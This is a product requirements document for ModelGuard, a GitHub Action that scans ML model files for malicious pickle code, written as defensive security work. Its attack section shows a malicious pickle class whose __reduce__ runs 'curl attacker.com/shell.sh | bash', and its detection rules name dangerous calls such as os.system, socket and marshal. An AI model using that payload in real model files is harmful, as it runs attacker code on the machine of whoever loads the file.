# ModelGuard PRD (Product Requirements Document)
## Model File Security Scanner as GitHub Action

**Version:** 1.0.0  
**Status:** Ready to Build  
**Target:** Weekend MVP (48 hours)

---

## Executive Summary

ModelGuard is a GitHub Action that automatically scans ML model files for malicious code, vulnerabilities, and security risks in CI/CD pipelines. It blocks dangerous models before they reach production by detecting pickle deserialization attacks, embedded malware, and known CVEs.

**Core Value Proposition:** "Block malicious AI models in your pipeline with one line of YAML."

---

## Problem Statement

### The Threat Landscape

- **44.9% of Hugging Face repositories** contain pickle-format models vulnerable to arbitrary code execution
- **400M+ monthly downloads** of pickle-only models (21% of all models)
- **100+ actively malicious models** discovered on Hugging Face in 2024 (JFrog research)
- **4 critical bypasses** found in picklescan (CVE-2025-1716), the scanner Hugging Face uses
- Major vendors affected: Meta, Google, Microsoft, NVIDIA, Intel all have pickle models

### The Gap

- **No turnkey CI/CD solution exists** for scanning model files
- Enterprise tools (Protect AI, HiddenLayer) require sales calls and enterprise pricing
- Open-source tools exist but require significant setup and maintenance
- **Zero self-serve options** for startups and developers under $500/month

### Attack Mechanism (Trivial to Execute)

```python
# Malicious model that executes code on load
import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell.sh | bash",))

pickle.dump(Malicious(), open("model.pkl", "wb"))
```

When ANY developer runs `torch.load("model.pkl")` or `pickle.load()`, the attacker's code executes with full user permissions.

---

## Product Overview

### What We're Building

A GitHub Action that:

1. **Triggers on PR/Push** - Automatically scans when model files are added/modified
2. **Scans Model Files** - Analyzes .pkl, .pt, .pth, .bin, .h5, .keras, .onnx, .safetensors, .gguf
3. **Detects Threats** - Identifies malicious payloads, dangerous imports, suspicious patterns
4. **Blocks Bad Models** - Fails the CI check if threats are found
5. **Reports Findings** - Outputs SARIF format for GitHub Security tab integration

### What We're NOT Building (Scope Exclusions)

- ❌ Guardrails or prompt injection detection
- ❌ Runtime monitoring or inference protection
- ❌ Model watermarking or IP protection
- ❌ Training data security
- ❌ Enterprise features (SSO, RBAC, audit logs) - Phase 2
- ❌ Self-hosted runners - Phase 2

---

## Target Users

### Primary: ML Engineers at Startups (50-500 employees)

**Profile:**
- Uses Hugging Face models regularly
- Downloads pre-trained models for fine-tuning
- Ships ML features in production applications
- Security-aware but not security experts
- Budget-conscious, values self-serve tools

**Pain Points:**
- "I don't know if this model is safe to load"
- "Our security team doesn't understand ML risks"
- "Enterprise security tools are too expensive and complex"
- "I want security without slowing down my workflow"

### Secondary: DevSecOps at Mid-Market Companies

**Profile:**
- Responsible for supply chain security
- Implementing shift-left security practices
- Needs to secure ML pipelines alongside traditional code
- Reports to security leadership

**Pain Points:**
- "We have SCA for code but nothing for models"
- "Can't manually review every model file"
- "Need audit trail for compliance"

---

## User Stories

### Must Have (P0)

| ID | Story | Acceptance Criteria |
|----|-------|---------------------|
| US-01 | As an ML engineer, I want to add ModelGuard to my repo with one line of YAML so I can secure my pipeline immediately | Action installs and runs in <2 minutes |
| US-02 | As an ML engineer, I want PRs with malicious models to be blocked automatically so bad code never reaches main | CI fails with clear error when threat detected |
| US-03 | As an ML engineer, I want to see exactly what was detected and why so I can make informed decisions | Detailed findings with threat type, location, severity |
| US-04 | As a developer, I want scans to complete in under 60 seconds so my CI isn't slowed down | 95th percentile scan time <60s for repos <1GB |
| US-05 | As a team lead, I want findings in the GitHub Security tab so we use our existing workflow | SARIF output integrated with GitHub Advanced Security |

### Should Have (P1)

| ID | Story | Acceptance Criteria |
|----|-------|---------------------|
| US-06 | As an ML engineer, I want to configure allowed/blocked patterns so I can customize for my use case | YAML config file support |
| US-07 | As a developer, I want to scan local files before pushing so I catch issues early | CLI mode available |
| US-08 | As a team lead, I want to see scan history and trends so I can track security posture | Dashboard with scan history |
| US-09 | As a security engineer, I want to allowlist known-safe models so I don't get false positives | Hash-based allowlisting |

### Nice to Have (P2)

| ID | Story | Acceptance Criteria |
|----|-------|---------------------|
| US-10 | As an enterprise user, I want webhook notifications so I can integrate with our SIEM | Webhook support for findings |
| US-11 | As a compliance officer, I want exportable reports so I can document our security controls | PDF/CSV export |

---

## Functional Requirements

### FR-01: GitHub Action Integration

**Input:**
```yaml
# .github/workflows/modelguard.yml
name: ModelGuard Security Scan
on:
  pull_request:
  push:
    branches: [main, master]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: modelguard/scan@v1
        with:
          path: ./models          # Optional: specific directory
          fail-on: high           # Optional: minimum severity to fail
          config: .modelguard.yml # Optional: config file path
```

**Output:**
- Exit code 0 (pass) or 1 (fail)
- SARIF file uploaded to GitHub Security
- Markdown summary in PR comment
- Detailed logs in Action output

### FR-02: File Detection & Scanning

**Supported File Types:**

| Extension | Format | Scanner | Risk Level |
|-----------|--------|---------|------------|
| .pkl, .pickle | Python Pickle | picklescan + fickling | Critical |
| .pt, .pth | PyTorch (pickle-based) | picklescan + fickling | Critical |
| .bin | PyTorch/Transformers | picklescan + fickling | Critical |
| .h5, .hdf5 | HDF5/Keras | Custom scanner | High |
| .keras | Keras v3 | Custom scanner | High |
| .onnx | ONNX | onnx validator | Medium |
| .safetensors | SafeTensors | Metadata check only | Low |
| .gguf | GGML/llama.cpp | Header validation | Low |
| .zip, .tar.gz | Compressed archives | Recursive extraction | Varies |

**Detection Flow:**

```
File Found → Identify Format → Extract if Compressed → Run Scanners → Aggregate Results → Report
```

### FR-03: Threat Detection

**Detection Categories:**

| Category | Description | Severity | Example |
|----------|-------------|----------|---------|
| CODE_EXECUTION | Arbitrary code in pickle | Critical | `os.system`, `subprocess.Popen` |
| REVERSE_SHELL | Network backdoor | Critical | Socket connections, netcat |
| FILE_SYSTEM | File read/write ops | High | `open()`, `os.remove()` |
| NETWORK | Outbound connections | High | `urllib`, `requests`, `socket` |
| DANGEROUS_IMPORT | Suspicious module imports | Medium | `ctypes`, `importlib` |
| OBFUSCATION | Encoded/compressed payloads | Medium | base64 + exec, marshal |
| KNOWN_MALWARE | Signature match | Critical | Hash of known malicious files |
| CVE_VULNERABLE | Known vulnerability | Varies | CVE-2024-5480, etc. |

**Detection Rules (Core Set):**

```yaml
# Dangerous builtins
- pattern: "builtins.eval"
  severity: critical
  message: "Arbitrary code execution via eval()"

- pattern: "builtins.exec"
  severity: critical
  message: "Arbitrary code execution via exec()"

- pattern: "os.system"
  severity: critical
  message: "System command execution"

- pattern: "subprocess.Popen"
  severity: critical
  message: "Subprocess execution"

- pattern: "subprocess.call"
  severity: critical
  message: "Subprocess execution"

# Network operations
- pattern: "socket.socket"
  severity: high
  message: "Raw socket creation (potential reverse shell)"

- pattern: "urllib.request.urlopen"
  severity: high
  message: "Network request capability"

- pattern: "requests.get"
  severity: medium
  message: "HTTP request capability"

# File operations
- pattern: "builtins.open"
  severity: medium
  message: "File operation capability"

- pattern: "os.remove"
  severity: high
  message: "File deletion capability"

- pattern: "shutil.rmtree"
  severity: high
  message: "Directory deletion capability"

# Obfuscation
- pattern: "base64.b64decode"
  severity: medium
  message: "Base64 decoding (potential obfuscation)"

- pattern: "marshal.loads"
  severity: high
  message: "Marshal deserialization (code execution)"

- pattern: "compile"
  severity: high
  message: "Dynamic code compilation"

# Known malicious patterns
- pattern: "__reduce_ex__"
  severity: medium
  message: "Custom pickle reduce (inspect manually)"

- pattern: "lambda"
  severity: low
  message: "Lambda function in pickle"
```

### FR-04: Output Formats

**SARIF Output (GitHub Security Integration):**

```json
{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [{
    "tool": {
      "driver": {
        "name": "ModelGuard",
        "version": "1.0.0",
        "informationUri": "https://modelguard.dev",
        "rules": [
          {
            "id": "MG001",
            "name": "ArbitraryCodeExecution",
            "shortDescription": { "text": "Pickle contains code execution payload" },
            "fullDescription": { "text": "The model file contains pickle opcodes that will execute arbitrary code when loaded." },
            "defaultConfiguration": { "level": "error" },
            "helpUri": "https://modelguard.dev/rules/MG001"
          }
        ]
      }
    },
    "results": [
      {
        "ruleId": "MG001",
        "level": "error",
        "message": { "text": "Detected os.system call in pickle file" },
        "locations": [{
          "physicalLocation": {
            "artifactLocation": { "uri": "models/malicious.pkl" },
            "region": { "startLine": 1 }
          }
        }]
      }
    ]
  }]
}
```

**Markdown Summary (PR Comment):**

```markdown
## 🛡️ ModelGuard Security Scan

**Status:** ❌ FAILED - 2 threats detected

### Findings

| File | Severity | Threat | Details |
|------|----------|--------|---------|
| `models/model.pkl` | 🔴 Critical | CODE_EXECUTION | `os.system` call detected |
| `models/utils.pt` | 🟠 High | NETWORK | `socket.socket` creation |

### Recommendations

1. **models/model.pkl**: Do not load this file. It contains code that will execute system commands. [Learn more](https://modelguard.dev/threats/code-execution)

2. **models/utils.pt**: Review this file manually. Network socket creation may be legitimate but requires verification.

---
*Scanned 5 files in 2.3s • [View full report](https://modelguard.dev/scans/abc123)*
```

**JSON Output (API/CLI):**

```json
{
  "scan_id": "abc123",
  "timestamp": "2024-12-18T10:30:00Z",
  "duration_ms": 2300,
  "status": "failed",
  "summary": {
    "files_scanned": 5,
    "files_clean": 3,
    "files_suspicious": 2,
    "critical": 1,
    "high": 1,
    "medium": 0,
    "low": 0
  },
  "findings": [
    {
      "file": "models/model.pkl",
      "format": "pickle",
      "size_bytes": 1048576,
      "sha256": "abc123...",
      "threats": [
        {
          "rule_id": "MG001",
          "category": "CODE_EXECUTION",
          "severity": "critical",
          "pattern": "os.system",
          "context": "pickle opcode REDUCE with os.system callable",
          "remediation": "Do not load this file. Replace with a SafeTensors version or verify provenance."
        }
      ]
    }
  ]
}
```

### FR-05: Configuration

**Config File (.modelguard.yml):**

```yaml
# .modelguard.yml
version: 1

# Directories to scan (default: entire repo)
include:
  - models/
  - weights/
  - checkpoints/

# Directories to ignore
exclude:
  - tests/fixtures/
  - .git/

# File size limits
max_file_size: 5GB
max_total_size: 20GB

# Severity threshold to fail CI
fail_on: high  # critical, high, medium, low, none

# Allowlist (by SHA256 hash)
allowlist:
  - sha256: "abc123..."  # Known safe model
    reason: "Verified by security team on 2024-01-15"
  - sha256: "def456..."
    reason: "Official HuggingFace release"

# Custom rules (extend default ruleset)
rules:
  # Disable a default rule
  - id: MG015
    enabled: false
  
  # Add custom pattern
  - id: CUSTOM001
    pattern: "company_internal_module"
    severity: low
    message: "Internal module reference detected"

# Output options
output:
  sarif: true
  json: true
  markdown: true
```

---

## Non-Functional Requirements

### NFR-01: Performance

| Metric | Target | Measurement |
|--------|--------|-------------|
| Scan speed | >100 MB/s | Files scanned per second |
| P50 latency | <10s | For repos with <100MB models |
| P95 latency | <60s | For repos with <1GB models |
| P99 latency | <180s | For repos with <5GB models |
| Memory usage | <2GB | Peak RAM during scan |
| CPU usage | <2 cores | Average utilization |

### NFR-02: Reliability

| Metric | Target |
|--------|--------|
| Uptime | 99.9% (GitHub Action availability) |
| False positive rate | <1% |
| False negative rate (critical) | <0.1% |
| Scan completion rate | >99.5% |

### NFR-03: Security

- No model files uploaded to external servers (all scanning local)
- No telemetry without explicit opt-in
- Secrets/credentials in config must not be logged
- Action runs in isolated GitHub runner environment
- Dependencies pinned to specific versions with hash verification

### NFR-04: Compatibility

| Platform | Support |
|----------|---------|
| GitHub Actions | ✅ Full support |
| GitLab CI | 🔜 Phase 2 |
| CircleCI | 🔜 Phase 2 |
| Jenkins | 🔜 Phase 2 |
| Local CLI | ✅ Full support |

| Runner OS | Support |
|-----------|---------|
| ubuntu-latest | ✅ Primary |
| ubuntu-22.04 | ✅ Supported |
| ubuntu-20.04 | ✅ Supported |
| macos-latest | ⚠️ Beta |
| windows-latest | 🔜 Phase 2 |

---

## Technical Architecture

### System Components

```
┌─────────────────────────────────────────────────────────────────┐
│                      GitHub Actions Runner                       │
├─────────────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                    ModelGuard Action                     │    │
│  ├─────────────────────────────────────────────────────────┤    │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │    │
│  │  │   Scanner   │  │   Scanner   │  │   Scanner   │     │    │
│  │  │   Engine    │  │   Rules     │  │   Plugins   │     │    │
│  │  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘     │    │
│  │         │                │                │            │    │
│  │  ┌──────┴────────────────┴────────────────┴──────┐     │    │
│  │  │              Orchestrator                      │     │    │
│  │  └──────┬────────────────┬────────────────┬──────┘     │    │
│  │         │                │                │            │    │
│  │  ┌──────┴──────┐  ┌──────┴──────┐  ┌──────┴──────┐     │    │
│  │  │    File     │  │   Report    │  │   Config    │     │    │
│  │  │   Walker    │  │  Generator  │  │   Loader    │     │    │
│  │  └─────────────┘  └─────────────┘  └─────────────┘     │    │
│  └─────────────────────────────────────────────────────────┘    │
│                              │                                   │
│                              ▼                                   │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                    Output Artifacts                      │    │
│  │  • SARIF → GitHub Security Tab                          │    │
│  │  • JSON → API/Programmatic Use                          │    │
│  │  • Markdown → PR Comments                               │    │
│  └─────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────┘
```

### Tech Stack

| Component | Technology | Rationale |
|-----------|------------|-----------|
| Runtime | Node.js 20 | GitHub Actions native, fast startup |
| Scanner Core | Python 3.11 | Pickle/ML ecosystem compatibility |
| Pickle Analysis | fickling + picklescan | Best-in-class open source |
| Archive Handling | 7zip, tar, unzip | Comprehensive format support |
| Config Parsing | js-yaml | Standard YAML parser |
| SARIF Generation | sarif-sdk | Official SARIF library |
| Testing | Jest + pytest | Dual runtime testing |

### Directory Structure

```
modelguard/
├── action.yml                 # GitHub Action definition
├── package.json               # Node.js dependencies
├── requirements.txt           # Python dependencies
├── src/
│   ├── index.ts              # Action entry point
│   ├── orchestrator.ts       # Main scan coordination
│   ├── config.ts             # Config loading & validation
│   ├── walker.ts             # File discovery
│   ├── reporters/
│   │   ├── sarif.ts          # SARIF output
│   │   ├── markdown.ts       # PR comment output
│   │   └── json.ts           # JSON output
│   └── scanners/
│       ├── base.ts           # Scanner interface
│       ├── pickle.ts         # Pickle/PyTorch scanner
│       ├── keras.ts          # Keras/HDF5 scanner
│       ├── onnx.ts           # ONNX scanner
│       └── safetensors.ts    # SafeTensors scanner
├── python/
│   ├── scan_pickle.py        # Pickle analysis wrapper
│   ├── scan_keras.py         # Keras analysis
│   └── rules/
│       └── default.yml       # Default detection rules
├── tests/
│   ├── fixtures/             # Test model files
│   ├── unit/                 # Unit tests
│   └── integration/          # E2E tests
├── docs/
│   └── rules/                # Rule documentation
└── .github/
    └── workflows/
        └── test.yml          # CI for the action itself
```

### Data Flow

```
1. TRIGGER
   └── PR opened/Push to branch
       └── GitHub triggers workflow

2. INITIALIZE
   └── Load action.yml
       └── Setup Node.js runtime
           └── Install dependencies (cached)
               └── Load config (.modelguard.yml)

3. DISCOVER
   └── Walk repository
       └── Filter by include/exclude patterns
           └── Identify model files by extension
               └── Queue files for scanning

4. SCAN (parallel)
   └── For each file:
       ├── Check allowlist (skip if matched)
       ├── Detect format (by magic bytes + extension)
       ├── Extract if compressed
       ├── Route to appropriate scanner
       │   ├── Pickle scanner (pickle, pt, pth, bin)
       │   ├── Keras scanner (h5, keras)
       │   ├── ONNX scanner (onnx)
       │   └── SafeTensors scanner (safetensors)
       └── Collect findings

5. AGGREGATE
   └── Merge all findings
       └── Deduplicate
           └── Sort by severity
               └── Apply fail_on threshold

6. REPORT
   └── Generate outputs
       ├── SARIF → Upload to GitHub Security
       ├── Markdown → Post PR comment
       └── JSON → Write to artifact

7. RESULT
   └── Exit code 0 (pass) or 1 (fail)
```

---

## API Specification

### Action Inputs

```yaml
inputs:
  path:
    description: 'Directory to scan (default: repository root)'
    required: false
    default: '.'
  
  config:
    description: 'Path to config file'
    required: false
    default: '.modelguard.yml'
  
  fail-on:
    description: 'Minimum severity to fail (critical, high, medium, low, none)'
    required: false
    default: 'high'
  
  output-sarif:
    description: 'Generate SARIF output'
    required: false
    default: 'true'
  
  output-json:
    description: 'Generate JSON output'
    required: false
    default: 'true'
  
  comment-on-pr:
    description: 'Post comment on PR with results'
    required: false
    default: 'true'
  
  max-file-size:
    description: 'Maximum file size to scan (e.g., 5GB)'
    required: false
    default: '5GB'
```

### Action Outputs

```yaml
outputs:
  status:
    description: 'Scan status (passed, failed, error)'
  
  findings-count:
    description: 'Total number of findings'
  
  critical-count:
    description: 'Number of critical findings'
  
  high-count:
    description: 'Number of high findings'
  
  sarif-file:
    description: 'Path to SARIF output file'
  
  json-file:
    description: 'Path to JSON output file'
  
  scan-duration:
    description: 'Scan duration in milliseconds'
```

### CLI Interface

```bash
# Install
npm install -g @modelguard/cli

# Basic scan
modelguard scan ./models

# Scan with options
modelguard scan ./models \
  --config .modelguard.yml \
  --fail-on high \
  --output sarif,json,markdown \
  --output-dir ./reports

# Check single file
modelguard check model.pkl

# Update rules database
modelguard update-rules

# Show version and rules info
modelguard info
```

---

## Pricing Model

### Tiers

| Tier | Price | Limits | Target |
|------|-------|--------|--------|
| **Free** | $0 | 1,000 scans/month, public repos only | OSS developers, evaluation |
| **Team** | $49/month | 25,000 scans, 10 private repos | Early startups |
| **Growth** | $199/month | 100,000 scans, unlimited repos | Growing companies |
| **Enterprise** | Custom | Volume pricing, SSO, support | Large organizations |

### What Counts as a Scan

- 1 scan = 1 workflow run (regardless of files scanned)
- Re-runs count as new scans
- Failed runs still count
- No per-file charges

### Free Tier Limitations

- Public repositories only
- Community support only (GitHub Issues)
- No SLA
- ModelGuard branding in PR comments

---

## Success Metrics

### Week 1 (Launch)

| Metric | Target |
|--------|--------|
| GitHub Marketplace installs | 100+ |
| Repos with successful scan | 50+ |
| GitHub stars | 200+ |
| Hacker News front page | Yes |

### Month 1

| Metric | Target |
|--------|--------|
| Weekly active repos | 500+ |
| Free tier users | 200+ |
| Paid conversions | 10+ |
| Twitter/X mentions | 50+ |

### Month 3

| Metric | Target |
|--------|--------|
| Weekly active repos | 2,000+ |
| MRR | $5,000+ |
| Enterprise leads | 20+ |
| Malicious models blocked | 100+ (documented) |

---

## Risk Assessment

### Technical Risks

| Risk | Impact | Likelihood | Mitigation |
|------|--------|------------|------------|
| Scanner bypass discovered | High | Medium | Continuous rule updates, bug bounty |
| False positives frustrate users | Medium | Medium | Allowlist feature, tunable sensitivity |
| Performance issues on large repos | Medium | Medium | Streaming processing, size limits |
| Dependency vulnerability | High | Low | Pin versions, automated updates |

### Business Risks

| Risk | Impact | Likelihood | Mitigation |
|------|--------|------------|------------|
| Larger player launches similar | High | High | Move fast, build community |
| GitHub builds native feature | Critical | Low | Expand beyond GitHub early |
| Low conversion to paid | High | Medium | Focus on team features |

---

## Launch Checklist

### Pre-Launch (Day 1)

- [ ] Core scanner working with pickle files
- [ ] GitHub Action deploys and runs
- [ ] SARIF output uploads to Security tab
- [ ] PR comment posts successfully
- [ ] Basic documentation (README, quickstart)
- [ ] Landing page live
- [ ] GitHub Marketplace listing submitted

### Launch Day (Day 2)

- [ ] Publish to GitHub Marketplace
- [ ] Post to Hacker News
- [ ] Post to r/MachineLearning
- [ ] Post to r/netsec
- [ ] Tweet launch announcement
- [ ] Send to personal network

### Post-Launch (Week 1)

- [ ] Monitor GitHub Issues
- [ ] Fix critical bugs immediately
- [ ] Engage with all comments/feedback
- [ ] Write technical blog post on pickle vulnerabilities
- [ ] Reach out to ML influencers

---

## Appendix A: Competitive Analysis

| Competitor | Focus | Pricing | Gap |
|------------|-------|---------|-----|
| Protect AI (ModelScan) | OSS scanner | Free (OSS) | No turnkey CI, no support |
| HiddenLayer | Enterprise platform | Enterprise only | No self-serve, expensive |
| Lakera | Prompt injection | $99+/month | Different problem space |
| CalypsoAI (F5) | Guardrails | Enterprise only | No model file scanning |
| Robust Intelligence (Cisco) | ML testing | Enterprise only | Not focused on security |

**Our Differentiation:**
- Self-serve from day 1
- Transparent, affordable pricing
- Purpose-built for CI/CD
- Developer-first experience
- Open-source core

---

## Appendix B: Security Research References

1. **PickleBall Paper** (Brown University, 2025) - Pickle deserialization analysis
2. **JFrog Malicious Models Report** (2024) - 100+ malicious models on HF
3. **Sonatype picklescan Bypasses** (CVE-2025-1716) - Scanner vulnerabilities
4. **MITRE ATLAS** - ML threat framework
5. **OWASP ML Security Top 10** - Industry standard threats
